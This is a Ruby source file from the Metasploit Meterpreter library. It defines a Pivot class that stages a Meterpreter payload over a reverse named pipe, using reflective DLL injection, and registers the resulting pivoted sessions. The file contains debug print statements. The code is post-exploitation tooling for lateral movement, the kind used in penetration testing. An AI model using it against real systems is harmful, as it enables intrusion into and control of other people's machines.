# -*- coding: binary -*-

require 'rex/post/meterpreter/inbound_packet_handler'
require 'securerandom'

module Rex
module Post
module Meterpreter

class PivotListener
  attr_accessor :id

  attr_accessor :stager

  def initialize(stager)
    self.id = [SecureRandom.uuid.gsub(/-/, '')].pack('H*')
    self.stager = stager
  end
end

class Pivot

  #
  # The associated meterpreter client instance
  #
  attr_accessor :client

  attr_accessor :pivot_session_guid

  attr_accessor :pivoted_session


  # Class modifications to support global pivot message
  # dispatching without having to register a per-instance handler
  class << self
    include Rex::Post::Meterpreter::InboundPacketHandler

    # Class request handler for all channels that dispatches requests
    # to the appropriate class instance's DIO handler
    def request_handler(client, packet)
      if packet.method == 'core_pivot_session_new'
        STDERR.puts("Received pivot packet! #{packet.inspect}\n")
        session_guid = packet.get_tlv_value(TLV_TYPE_SESSION_GUID)
        listener_id = packet.get_tlv_value(TLV_TYPE_PIVOT_ID)
        Pivot.new(client, session_guid, listener_id)
      end
      true
    end
  end

  def Pivot.create_listener(client, opts={})
    request = Packet.create_request('core_pivot_add')
    request.add_tlv(TLV_TYPE_PIVOT_NAMED_PIPE_NAME, opts[:pipe_name])

    # TODO: use the framework to generate the whole lot, including a session type
    c = Class.new(::Msf::Payload)
    c.include(::Msf::Payload::Stager)
    #c.include(::Msf::Payload::TransportConfig)

    # Include the appropriate reflective dll injection module for the target process architecture...
    if opts[:arch] == ARCH_X86
      c.include(::Msf::Payload::Windows::MeterpreterLoader)
    elsif opts[:arch] == ARCH_X64
      c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)
    end

    stage_opts = {
      force_write_handle: true,
      datastore: {
        'PIPEHOST' => opts[:pipe_host],
        'PIPENAME' => opts[:pipe_name]
      }
    }

    # Create the migrate stager
    stager = c.new()

    stage_opts[:transport_config] = [stager.transport_config_reverse_named_pipe(stage_opts)]
    stage = stager.stage_payload(stage_opts)

    pivot_listener = PivotListener.new(stager)

    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA, stage)
    request.add_tlv(TLV_TYPE_PIVOT_STAGE_DATA_SIZE, stage.length)
    request.add_tlv(TLV_TYPE_PIVOT_ID, pivot_listener.id)

    client.send_request(request)

    client.add_pivot_listener(pivot_listener)
  end

  def initialize(client, session_guid, listener_id)
    self.client = client
    self.pivot_session_guid = session_guid

    opts = {
      pivot_session: client,
      session_guid:  session_guid
    }

    listener = client.find_pivot_listener(listener_id)

    STDERR.puts("about to create the pivoted session instance 3\n")
    begin
      STDERR.puts("Stage: #{listener.stager.inspect}\n")
      STDERR.puts("Stage Session: #{listener.stager.session.inspect}\n")
      self.pivoted_session = listener.stager.session.new(nil, opts)
    rescue => e
      STDERR.puts(e.inspect)
    end
    STDERR.puts("pivoted session instance created: #{self.pivoted_session.inspect}\n")

    self.client.add_pivot(self)

    STDERR.puts("Setting the framework instance\n")
    self.pivoted_session.framework = self.client.framework
    STDERR.puts("Invoking the on_session method\n")
    self.pivoted_session.on_session(self.pivoted_session)
    STDERR.puts("Registering the session with the framework\n")
    self.client.framework.sessions.register(self.pivoted_session)
    STDERR.puts("done!\n")
  end

protected

  #
  # Cleans up any lingering resources
  #
  def cleanup
  end

end

end; end; end


